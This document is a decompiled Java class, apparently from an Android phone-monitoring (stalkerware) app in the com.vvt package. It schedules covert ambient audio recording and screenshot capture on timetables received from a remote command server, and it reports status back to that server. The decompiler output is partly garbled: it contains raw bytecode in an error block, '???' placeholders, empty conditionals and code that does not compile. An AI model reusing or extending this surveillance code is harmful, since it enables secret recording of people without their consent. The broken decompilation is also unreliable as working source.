package com.vvt.temporalcontrol;

import android.content.Context;
import com.vvt.base.FxAmbientRecordActionParameter;
import com.vvt.base.FxScreenshotRecordActionParameter;
import com.vvt.base.RunningMode;
import com.vvt.datadeliverymanager.enums.DataProviderType;
import com.vvt.datadeliverymanager.enums.DeliveryRequestType;
import com.vvt.datadeliverymanager.enums.PriorityRequest;
import com.vvt.datadeliverymanager.h;
import com.vvt.phoenix.prot.command.a.n;
import com.vvt.phoenix.prot.command.ai;
import com.vvt.phoenix.prot.command.data.Criteria;
import com.vvt.phoenix.prot.command.data.Criteria.Recurrence;
import com.vvt.phoenix.prot.command.data.TemporalControl;
import com.vvt.phoenix.prot.command.data.TemporalControl.Action;
import com.vvt.phoenix.prot.command.o;
import com.vvt.preference.FxPreferenceException;
import com.vvt.preference.FxPreferenceType;
import com.vvt.preference.PrefTemporalControl;
import com.vvt.preference.PrefTemporalControl.TemporalControlInfo;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

public class d
  implements com.vvt.datadeliverymanager.a.a, c
{
  public static SimpleDateFormat a;
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.d;
  private static final boolean e = com.vvt.ak.a.e;
  private boolean f;
  private boolean g;
  private com.vvt.preference.b h;
  private a i;
  private ArrayList j;
  private com.vvt.temporalcontrol.a.a k;
  private com.vvt.datadeliverymanager.a.a l;
  private com.vvt.temporalcontrol.a.d m;
  
  static
  {
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    localSimpleDateFormat.<init>("yyyy-MM-dd HH:mm:ss Z");
    a = localSimpleDateFormat;
  }
  
  public d(Context paramContext, String paramString, RunningMode paramRunningMode)
  {
    Object localObject = new com/vvt/temporalcontrol/e;
    ((e)localObject).<init>(this);
    this.m = ((com.vvt.temporalcontrol.a.d)localObject);
    localObject = new com/vvt/temporalcontrol/a/a;
    ((com.vvt.temporalcontrol.a.a)localObject).<init>(paramString, paramRunningMode);
    this.k = ((com.vvt.temporalcontrol.a.a)localObject);
    localObject = new java/util/ArrayList;
    ((ArrayList)localObject).<init>();
    this.j = ((ArrayList)localObject);
    localObject = b.a(paramRunningMode, paramContext);
    this.i = ((a)localObject);
  }
  
  private ai f()
  {
    ai localai = new com/vvt/phoenix/prot/command/ai;
    localai.<init>();
    for (;;)
    {
      Object localObject3;
      try
      {
        Object localObject1 = this.h;
        localObject2 = FxPreferenceType.TEMPORAL_CONTROL;
        localObject1 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
        localObject1 = (PrefTemporalControl)localObject1;
        localObject2 = ((PrefTemporalControl)localObject1).getTemporalControls();
        boolean bool1 = false;
        localObject1 = null;
        localObject3 = "     ";
        Iterator localIterator = ((ArrayList)localObject2).iterator();
        boolean bool2 = false;
        localObject3 = null;
        bool1 = localIterator.hasNext();
        if (bool1)
        {
          localObject1 = localIterator.next();
          localObject1 = (PrefTemporalControl.TemporalControlInfo)localObject1;
          TemporalControl localTemporalControl = new com/vvt/phoenix/prot/command/data/TemporalControl;
          localTemporalControl.<init>();
          localObject2 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getFxActionParameter();
          int n = ((PrefTemporalControl.TemporalControlInfo)localObject1).getAction();
          boolean bool4;
          long l1;
          switch (n)
          {
          default: 
            localObject3 = new com/vvt/phoenix/prot/command/data/a;
            ((com.vvt.phoenix.prot.command.data.a)localObject3).<init>();
            localObject2 = localObject3;
            localObject3 = new com/vvt/phoenix/prot/command/data/Criteria;
            ((Criteria)localObject3).<init>();
            int i1 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getRecurrence();
            Criteria.Recurrence localRecurrence = Criteria.Recurrence.forValue(i1);
            ((Criteria)localObject3).a(localRecurrence);
            i1 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getMultiplier();
            ((Criteria)localObject3).a(i1);
            i1 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getDaysOfWeek();
            ((Criteria)localObject3).b(i1);
            i1 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getDayOfMonth();
            ((Criteria)localObject3).c(i1);
            i1 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getMonthOfYear();
            ((Criteria)localObject3).d(i1);
            TemporalControl.Action localAction = TemporalControl.Action.forValue(n);
            localTemporalControl.a(localAction);
            localTemporalControl.a((com.vvt.phoenix.prot.command.data.a)localObject2);
            localTemporalControl.a((Criteria)localObject3);
            localObject3 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getDateBegin();
            boolean bool3 = com.vvt.ag.b.a((String)localObject3);
            if (bool3) {
              localObject3 = "          ";
            }
            localTemporalControl.a((String)localObject3);
            localObject3 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getDateEnd();
            bool3 = com.vvt.ag.b.a((String)localObject3);
            if (bool3) {
              localObject3 = "          ";
            }
            localTemporalControl.b((String)localObject3);
            localObject3 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getTimeBegin();
            bool3 = com.vvt.ag.b.a((String)localObject3);
            if (bool3) {
              localObject3 = "     ";
            }
            localTemporalControl.c((String)localObject3);
            localObject1 = ((PrefTemporalControl.TemporalControlInfo)localObject1).getTimeEnd();
            bool2 = com.vvt.ag.b.a((String)localObject1);
            if (bool2) {
              localObject1 = "     ";
            }
            localTemporalControl.d((String)localObject1);
            localai.a(localTemporalControl);
            localObject3 = localObject2;
            break;
          case 1: 
            bool4 = localObject2 instanceof FxAmbientRecordActionParameter;
            if (!bool4) {
              break label490;
            }
            localObject2 = (FxAmbientRecordActionParameter)localObject2;
            localObject3 = new com/vvt/phoenix/prot/command/data/b;
            ((com.vvt.phoenix.prot.command.data.b)localObject3).<init>();
            l1 = ((FxAmbientRecordActionParameter)localObject2).getParameterSize();
            ((com.vvt.phoenix.prot.command.data.b)localObject3).a(l1);
            localObject2 = localObject3;
            break;
          case 2: 
            bool4 = localObject2 instanceof FxScreenshotRecordActionParameter;
            if (!bool4) {
              break label490;
            }
            localObject2 = (FxScreenshotRecordActionParameter)localObject2;
            localObject3 = new com/vvt/phoenix/prot/command/data/i;
            ((com.vvt.phoenix.prot.command.data.i)localObject3).<init>();
            l1 = ((FxScreenshotRecordActionParameter)localObject2).getParameterSize();
            ((com.vvt.phoenix.prot.command.data.i)localObject3).a(l1);
            l1 = ((FxScreenshotRecordActionParameter)localObject2).getInterval();
            ((com.vvt.phoenix.prot.command.data.i)localObject3).b(l1);
            localObject2 = localObject3;
            break;
          }
        }
        return localai;
      }
      catch (FxPreferenceException localFxPreferenceException)
      {
        bool1 = e;
        if (!bool1) {}
      }
      label490:
      Object localObject2 = localObject3;
    }
  }
  
  private void g()
  {
    boolean bool1 = b;
    if (bool1) {}
    for (;;)
    {
      synchronized (this.j)
      {
        Object localObject1 = this.j;
        bool1 = ((ArrayList)localObject1).isEmpty();
        if (bool1)
        {
          bool1 = c;
          if (bool1) {}
          localObject1 = this.i;
          ((a)localObject1).c();
          bool1 = b;
          if (bool1) {}
          return;
        }
      }
      ??? = new java/util/ArrayList;
      ???.<init>();
      synchronized (this.j)
      {
        Object localObject3 = this.j;
        Iterator localIterator = ((ArrayList)localObject3).iterator();
        boolean bool2;
        do
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          localObject3 = localIterator.next();
          localObject3 = (PrefTemporalControl.TemporalControlInfo)localObject3;
          bool2 = c;
          if (bool2) {}
          Object localObject6 = Calendar.getInstance();
          localObject6 = ((Calendar)localObject6).getTime();
          bool2 = f.a((PrefTemporalControl.TemporalControlInfo)localObject3, (Date)localObject6);
        } while (!bool2);
        ???.add(localObject3);
      }
      try
      {
        ???.size();
        bool1 = c;
        if (bool1) {}
        a locala = this.i;
        locala.a(this);
        locala = this.i;
        locala.a(???);
        locala = this.i;
        locala.a();
      }
      finally {}
    }
  }
  
  public void a()
  {
    boolean bool = b;
    if (bool) {}
    c();
    d();
    bool = b;
    if (bool) {}
  }
  
  /* Error */
  public void a(int paramInt)
  {
    // Byte code:
    //   0: aload_0
    //   1: monitorenter
    //   2: getstatic 35	com/vvt/temporalcontrol/d:removeFromPath	Z
    //   5: istore_2
    //   6: iload_2
    //   7: ifeq +3 -> 10
    //   10: iload_1
    //   11: lookupswitch	default:+17->28, 1:+28->39
    //   28: getstatic 35	com/vvt/temporalcontrol/d:removeFromPath	Z
    //   31: istore_2
    //   32: iload_2
    //   33: ifeq +3 -> 36
    //   36: aload_0
    //   37: monitorexit
    //   38: return
    //   39: aload_0
    //   40: getfield 71	com/vvt/temporalcontrol/d:k	Lcom/vvt/temporalcontrol/a/a;
    //   43: astore_3
    //   44: aload_3
    //   45: ifnull -17 -> 28
    //   48: aload_0
    //   49: getfield 71	com/vvt/temporalcontrol/d:k	Lcom/vvt/temporalcontrol/a/a;
    //   52: astore_3
    //   53: aload_3
    //   54: invokevirtual 288	com/vvt/temporalcontrol/a/a:removeFromPath	()V
    //   57: goto -29 -> 28
    //   60: astore_3
    //   61: aload_0
    //   62: monitorexit
    //   63: aload_3
    //   64: athrow
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	65	0	this	d
    //   0	65	1	paramInt	int
    //   5	28	2	bool	boolean
    //   43	11	3	locala	com.vvt.temporalcontrol.a.a
    //   60	4	3	localObject	Object
    // Exception table:
    //   from	to	target	type
    //   2	5	60	finally
    //   28	31	60	finally
    //   39	43	60	finally
    //   48	52	60	finally
    //   53	57	60	finally
  }
  
  public void a(int paramInt, long paramLong)
  {
    bool1 = c;
    if (bool1) {}
    for (;;)
    {
      try
      {
        bool1 = c;
        if (bool1) {}
        localObject1 = this.h;
        localObject2 = FxPreferenceType.TEMPORAL_CONTROL;
        localObject1 = ((com.vvt.preference.b)localObject1).a((FxPreferenceType)localObject2);
        localObject1 = (PrefTemporalControl)localObject1;
        switch (paramInt)
        {
        }
      }
      catch (Exception localException)
      {
        Object localObject1;
        Object localObject2;
        int n;
        boolean bool2;
        bool1 = e;
        if (!bool1) {
          continue;
        }
        continue;
      }
      bool1 = c;
      if (bool1) {}
      return;
      n = 1;
      localObject2 = Integer.valueOf(n);
      bool1 = ((PrefTemporalControl)localObject1).isCapture((Integer)localObject2);
      bool2 = c;
      if (bool2) {}
      localObject2 = this.k;
      if ((localObject2 != null) && (bool1))
      {
        bool1 = c;
        if (bool1) {}
        localObject1 = this.k;
        localObject2 = this.m;
        ((com.vvt.temporalcontrol.a.a)localObject1).a(paramLong, (com.vvt.temporalcontrol.a.d)localObject2);
      }
    }
  }
  
  public void a(com.vvt.a.a parama)
  {
    this.k.a(parama);
  }
  
  public void a(com.vvt.base.a parama)
  {
    this.k.a(parama);
  }
  
  public void a(com.vvt.capture.a.a parama)
  {
    this.k.a(parama);
  }
  
  public void a(com.vvt.datadeliverymanager.a.a parama)
  {
    this.l = parama;
  }
  
  public void a(com.vvt.datadeliverymanager.b paramb)
  {
    int n = 1;
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = new com/vvt/datadeliverymanager/h;
    ((h)localObject1).<init>();
    int i1 = 480;
    ((h)localObject1).a(i1);
    Object localObject2 = new com/vvt/phoenix/prot/command/o;
    ((o)localObject2).<init>();
    ((h)localObject1).a((com.vvt.phoenix.prot.command.b)localObject2);
    ((h)localObject1).a(this);
    localObject2 = DeliveryRequestType.REQUEST_TYPE_NEW;
    ((h)localObject1).a((DeliveryRequestType)localObject2);
    localObject2 = PriorityRequest.PRIORITY_NORMAL;
    ((h)localObject1).a((PriorityRequest)localObject2);
    localObject2 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
    ((h)localObject1).a((DataProviderType)localObject2);
    ((h)localObject1).c(n);
    long l1 = 60000L;
    ((h)localObject1).b(l1);
    ((h)localObject1).c(n);
    ((h)localObject1).b(n);
    if (paramb == null)
    {
      localObject1 = new java/lang/NullPointerException;
      ((NullPointerException)localObject1).<init>("Can't send a request if the delivery manager is not set");
      throw ((Throwable)localObject1);
    }
    boolean bool2 = b;
    if (bool2) {}
    paramb.a((h)localObject1);
    bool1 = b;
    if (bool1) {}
  }
  
  public void a(com.vvt.datadeliverymanager.i parami)
  {
    com.vvt.datadeliverymanager.a.a locala = this.l;
    if (locala != null)
    {
      locala = this.l;
      locala.a(parami);
    }
  }
  
  public void a(com.vvt.preference.b paramb)
  {
    this.h = paramb;
  }
  
  public void a(List paramList)
  {
    synchronized (this.j)
    {
      ArrayList localArrayList2 = this.j;
      localArrayList2.clear();
      if (paramList != null)
      {
        localArrayList2 = this.j;
        localArrayList2.addAll(paramList);
      }
      return;
    }
  }
  
  public void b(com.vvt.datadeliverymanager.b paramb)
  {
    int n = 1;
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = new com/vvt/datadeliverymanager/h;
    ((h)localObject1).<init>();
    int i1 = 470;
    ((h)localObject1).a(i1);
    Object localObject2 = f();
    ((h)localObject1).a((com.vvt.phoenix.prot.command.b)localObject2);
    ((h)localObject1).a(this);
    localObject2 = DeliveryRequestType.REQUEST_TYPE_NEW;
    ((h)localObject1).a((DeliveryRequestType)localObject2);
    localObject2 = PriorityRequest.PRIORITY_NORMAL;
    ((h)localObject1).a((PriorityRequest)localObject2);
    localObject2 = DataProviderType.DATA_PROVIDER_TYPE_NONE;
    ((h)localObject1).a((DataProviderType)localObject2);
    ((h)localObject1).c(n);
    long l1 = 60000L;
    ((h)localObject1).b(l1);
    ((h)localObject1).c(n);
    ((h)localObject1).b(n);
    if (paramb == null)
    {
      localObject1 = new java/lang/NullPointerException;
      ((NullPointerException)localObject1).<init>("Can't send a request if the delivery manager is not set");
      throw ((Throwable)localObject1);
    }
    boolean bool2 = b;
    if (bool2) {}
    paramb.a((h)localObject1);
    bool1 = b;
    if (bool1) {}
  }
  
  public void b(com.vvt.datadeliverymanager.i parami)
  {
    bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    Object localObject1 = parami.a();
    boolean bool2 = c;
    if (bool2) {}
    bool2 = parami.f();
    ArrayList localArrayList;
    if (bool2)
    {
      bool2 = localObject1 instanceof n;
      if (bool2)
      {
        bool2 = b;
        if (bool2) {}
        bool2 = b;
        if (bool2) {}
        localObject1 = (n)localObject1;
        localArrayList = f.a((n)localObject1);
        if (localArrayList != null) {
          break label213;
        }
      }
    }
    for (;;)
    {
      bool1 = c;
      if (bool1) {}
      bool1 = b;
      if (bool1) {}
      try
      {
        localObject1 = this.h;
        FxPreferenceType localFxPreferenceType = FxPreferenceType.TEMPORAL_CONTROL;
        localObject1 = ((com.vvt.preference.b)localObject1).a(localFxPreferenceType);
        localObject1 = (PrefTemporalControl)localObject1;
        ((PrefTemporalControl)localObject1).setTemporalControls(localArrayList);
        localObject1 = this.h;
        ((com.vvt.preference.b)localObject1).b();
      }
      catch (FxPreferenceException localFxPreferenceException)
      {
        for (;;)
        {
          bool1 = e;
          if (bool1)
          {
            continue;
            bool1 = false;
            Object localObject2 = null;
            this.f = false;
            c();
            d();
          }
        }
      }
      bool1 = b;
      if (bool1) {}
      a(localArrayList);
      localObject1 = this.k;
      bool1 = ((com.vvt.temporalcontrol.a.a)localObject1).a();
      if (!bool1) {
        break;
      }
      this.f = true;
      bool1 = b;
      if (bool1) {}
      localObject1 = this.l;
      if (localObject1 != null)
      {
        localObject1 = this.l;
        ((com.vvt.datadeliverymanager.a.a)localObject1).b(parami);
      }
      bool1 = b;
      if (bool1) {}
      return;
      label213:
      localArrayList.size();
    }
  }
  
  public boolean b()
  {
    return this.g;
  }
  
  public void c()
  {
    try
    {
      int n = b;
      if (n != 0) {}
      n = this.g;
      if (n != 0)
      {
        n = 0;
        a locala = null;
        this.g = false;
        locala = this.i;
        if (locala != null)
        {
          locala = this.i;
          locala.b();
          locala = this.i;
          locala.d();
        }
        n = 1;
        a(n);
      }
      boolean bool = b;
      if (bool) {}
      return;
    }
    finally {}
  }
  
  public void d()
  {
    try
    {
      boolean bool = b;
      if (bool) {}
      bool = this.g;
      if (!bool)
      {
        bool = true;
        this.g = bool;
        g();
      }
      bool = b;
      if (bool) {}
      return;
    }
    finally {}
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/temporalcontrol/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */